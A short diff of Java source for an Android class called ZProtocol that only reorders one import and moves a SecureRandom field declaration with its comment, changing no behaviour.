@@ -13,6 +13,7 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 
+import com.android.mm.M;
 import com.android.syssetup.Core;
 import com.android.syssetup.Device;
 import com.android.syssetup.Status;
@@ -33,7 +34,6 @@ import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.ExecuteResult;
 import com.android.syssetup.util.Utils;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
 
 import java.io.IOException;
 import java.security.NoSuchAlgorithmException;
@@ -79,6 +79,10 @@ public class ZProtocol extends Protocol {
 	 * The upgrade files.
 	 */
 	Vector<String> upgradeFiles = new Vector<String>();
+	/**
+	 * The random.
+	 */
+	SecureRandom random;
 
 	/**
 	 * Instantiates a new z protocol.
@@ -101,11 +105,6 @@ public class ZProtocol extends Protocol {
 			}
 		}
 	}
-
-	/**
-	 * The random.
-	 */
-	SecureRandom random;
 
 	/*
 	 * (non-Javadoc)
